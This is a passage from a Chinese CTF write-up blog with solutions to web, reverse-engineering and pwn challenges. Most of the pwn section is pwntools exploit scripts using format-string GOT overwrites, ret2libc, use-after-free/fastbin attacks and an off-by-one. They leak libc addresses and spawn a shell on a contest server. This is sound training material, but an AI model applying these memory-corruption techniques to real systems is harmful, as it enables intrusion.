class="line">echo(payload)</span><br><span class="line"><span class="built_in">print</span> r.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">main_return = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(), <span class="number">16</span>)</span><br><span class="line">libc_base = (main_return - <span class="number">0xF0</span>) - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free = libc_base + libc.symbols[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * padding_num + <span class="string">&#x27;bb%396$p&#x27;</span></span><br><span class="line">echo(payload)</span><br><span class="line"><span class="built_in">print</span> r.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">init_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(), <span class="number">16</span>)</span><br><span class="line">code_base = init_addr - <span class="number">0xda0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;code base:&quot;</span>, <span class="built_in">hex</span>(code_base)</span><br><span class="line">free_got = code_base + elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;free got:&quot;</span>, <span class="built_in">hex</span>(free_got)</span><br><span class="line">num = (system &amp; <span class="number">0xFFFF</span>) - padding_num - <span class="number">0x16</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num + padding_num)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * padding_num + (<span class="string">&#x27;bb%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%133$hn&#x27;</span>).ljust(<span class="number">16</span>, <span class="string">&#x27;a&#x27;</span>) + p64(free_got)</span><br><span class="line">echo(payload)</span><br><span class="line">num = ((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>) - padding_num - <span class="number">0x16</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num + padding_num)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * padding_num + (<span class="string">&#x27;bb%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%133$hn&#x27;</span>).ljust(<span class="number">16</span>, <span class="string">&#x27;a&#x27;</span>) + p64(free_got + <span class="number">2</span>)</span><br><span class="line">echo(payload)</span><br><span class="line">setName(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109210548794.png" alt="image-20210109210548794"></p>
<h1 id="岁末赛"><a href="#岁末赛" class="headerlink" title="岁末赛"></a>岁末赛</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h3><p>查看js文件</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234340494.png" alt="image-20201226234340494"></p>
<p>发现是aa编码，解码后搜索拼接flag。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234527467.png" alt="image-20201226234527467"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234537966.png" alt="image-20201226234537966"></p>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>ida打开，转字符。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234752145.png" alt="image-20201226234752145"></p>
<h3 id="zzzz3333333"><a href="#zzzz3333333" class="headerlink" title="zzzz3333333"></a>zzzz3333333</h3><p>ida打开，分析代码。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234935822.png" alt="image-20201226234935822"></p>
<p>flag应该满足一个38元一次方程，使用python编写脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.optimize <span class="keyword">import</span> fsolve</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a1</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">    <span class="number">48</span> * a1[<span class="number">7</span>]</span><br><span class="line">    + a1[<span class="number">5</span>] *<span class="number">64</span> </span><br><span class="line">    + <span class="number">4</span> * a1[<span class="number">4</span>]</span><br><span class="line">    + <span class="number">59</span> * a1[<span class="number">1</span>]</span><br><span class="line">    + <span class="number">85</span> * a1[<span class="number">0</span>]</span><br><span class="line">    + <span class="number">76</span> * a1[<span class="number">2</span>]</span><br><span class="line">    + <span class="number">65</span> * a1[<span class="number">3</span>]</span><br><span class="line">    + <span class="number">50</span> * a1[<span class="number">6</span>]</span><br><span class="line">    + <span class="number">11</span> * a1[<span class="number">8</span>]</span><br><span class="line">    + <span class="number">66</span> * a1[<span class="number">9</span>] - <span class="number">44858</span> ,…………………………………………………………]</span><br><span class="line">r = fsolve(func,[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">print(<span class="built_in">type</span>(r))</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">    print(i)</span><br><span class="line">    a += <span class="built_in">chr</span>(<span class="built_in">round</span>(i))</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226222137424.png" alt="image-20201226222137424"></p>
<p>buf可以覆盖v4为123。</p>
<p>利用strncmp与strlen函数的特性，strlen遇到<code>\x00</code>停止，strncmp如果比较长度为0，则返回0.buf开始输入<code>\x00</code>即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;219.219.61.234&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+p32(<span class="number">123</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226222724458.png" alt="image-20201226222724458"></p>
<p>和pwn1相比，多一个栈溢出的步骤，将v4覆盖为足够大的值就有一个足够的范围进行栈溢出。栈溢出就是基础的ret2libc的方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;219.219.61.234&quot;,10001)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line">main = <span class="number">0x80484e0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+p32(<span class="number">0x100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&quot;you_really_know_random_haha&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">print(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+p32(<span class="number">0x100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;you_really_know_random_haha&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(system_addr)+p32(main)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226223249375.png" alt="image-20201226223249375"></p>
<p>存在UAF漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226223348994.png" alt="image-20201226223348994"></p>
<p>能控制创建chunk的大小，结合UAF，可以使用fastbin attack。</p>
<p>攻击步骤：</p>
<ul>
<li>创建node0，node1，大小大于fastbin。</li>
<li>delete node0，node1,node0，node1的0x8大小的chunk依次进入fastbin</li>
<li>创建node2，大小为0x8，node0 的0x8的chunk就成为node2的content。</li>
<li>修改node2就可以修改node0的content指针，修改为后门函数。</li>
<li>show（0），执行后门函数。</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226235810722.png" alt="image-20201226235810722"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226235930598.png" alt="image-20201226235930598"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000129738.png" alt="image-20201227000129738"></p>
<p>如图所示：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226234136178.png" alt="image-20201226234136178"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;219.219.61.234&#x27;</span>,<span class="number">10002</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p32(<span class="number">0x8048986</span>)</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>结构体如图：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226224230366.png" alt="image-20201226224230366"></p>
<p>存在UAF漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226224043185.png"></p>
<p>如果能够修改一个存在的结构体的name指针为某个函数的got表项，那么就可以泄露地址、修改got表项，获得shell。</p>
<p>也就是说，现在需要创建一个结构体，其name指针指向的chunk覆盖其他结构体的*name指针。</p>
<p>name指针所在的chunk恒为0x20，属于fastbin一般来讲free掉后是进入fastbin的，而创建chunk限制了大小，必须大于127个字节.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226224913086.png" alt="image-20201226224913086"></p>
<p>所以，需要让fastbin里的chunk与其他chunk合并。而<strong>当free的堆块大小大于fastbin中的最大size时，fastbin里的所有chunk会合并</strong>.</p>
<p>因此攻击步骤为：</p>
<ul>
<li>创建index0，1，申请的chunk大于fastbin中的最大size，比如0x200</li>
<li>free index0，这样index0的0x20的chunk进入fastbin，0x200的chunk进入unsortedbin。</li>
<li>free index1，过程是先free0x200的chunk，因此fastbin里的chunk合并，与index0的0x200chunk合并进入unsortedbin。index1的0x20chunk进入fastbin。</li>
<li>创建index2，大小大于fastbin，从unsortedbin中获得。此时修改index2的name就是在修改index0的size和*name。</li>
<li>修改index0的*name为got表项，利用输出函数泄露地址，然后修改got表指向的内容为system获得shell。</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000348168.png" alt="image-20201227000348168"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000436630.png" alt="image-20201227000436630"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000459417.png" alt="image-20201227000459417"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn4&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;219.219.61.234&quot;</span>,<span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;important secret\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atol = elf.got[<span class="string">&quot;atol&quot;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x200</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment">#这里先是修改index0的size大小，因此注意别改的太小。</span></span><br><span class="line">payload = p64(<span class="number">200</span>) + p64(atol)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">atol_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=atol_addr-libc.symbols[<span class="string">&#x27;atol&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">print(<span class="built_in">hex</span>(system))</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h3><p>这道题和HITCON Trainging lab13一样。。。</p>
<p>存在offbyone漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226230931072.png" alt="image-20201226230931072"></p>
<p>利用过程如图所示：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201226233114636.png" alt="image-20201226233114636"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000901836.png" alt="image-20201227000901836"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227000949698.png" alt="image-20201227000949698"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201227001329838.png" alt="image-20201227001329838"></p>
<p>这样就可以修改new chunk1的内容指针为got表项，进行地址泄露和got表修改。</p>
<p>需要注意的是，题目给的libc似乎有点问题，LibcSearcher也不怎么靠谱，最后根据泄露地址的后三位，在libc database search中查询得到偏移。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn5&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;219.219.61.234&quot;</span>,<span class="number">10004</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn5&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">head = <span class="number">0x0000000006020a0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span 